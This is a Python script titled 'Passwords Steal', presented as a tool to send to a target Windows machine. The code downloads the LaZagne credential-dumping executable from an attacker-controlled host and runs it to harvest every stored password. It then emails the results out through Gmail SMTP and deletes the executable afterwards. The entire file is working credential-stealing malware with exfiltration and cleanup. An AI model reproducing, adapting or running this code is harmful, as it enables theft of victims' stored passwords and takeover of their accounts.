#!/usr/bin/env python3.11

"""
Script Name: Passwords Steal 
Author: Abedelrahman Adel Almorssy .
Date: June 15, 2023
Description: This script demonstrates how could steal password from target-machine and send it back to attacker-machine . 

Summary:
This script install Malware-File and execute it on Target-Windows-Machine . 

Usage:
- Make sure the Requests library is installed.
- Adjust the URL and data parameters according to your needs.
- Send script to target-machine . 

Version History:
- 1.0.0 (June 15, 2023): Initial release

License: [MIT license]
"""


import requests
import smtplib
from subprocess import check_output
from os import remove,chdir
from tempfile import gettempdir

TMP_Dir = gettempdir()
def Install(URL: str) -> None:
    chdir(TMP_Dir)
    Get_Request_Result: requests.get = requests.get(url=URL)
    FileName = URL.split("/")[-1]
    with open(FileName, "wb") as laZagneFile:
        laZagneFile.write(Get_Request_Result.content)
        # return laZagneFile


def Execute() -> check_output:
    Process: check_output = check_output(".\laZagne.exe all", shell=True, text=True)
    return Process


def Server(Email: str) -> None:
    SERVER = smtplib.SMTP("smtp.gmail.com", 587)
    SERVER.starttls()
    SERVER.login(user="Email@gmail.com", password="YourGamil-AppPassword")
    SERVER.sendmail(
        from_addr="Email@gmail.com", to_addrs="Email@example.com", msg=Email
    )
    SERVER.quit()


Install(URL="http://192.168.100.11/laZagne.exe")
Command_Result = Execute()
Server(Email=Command_Result)
remove("laZagne.exe")
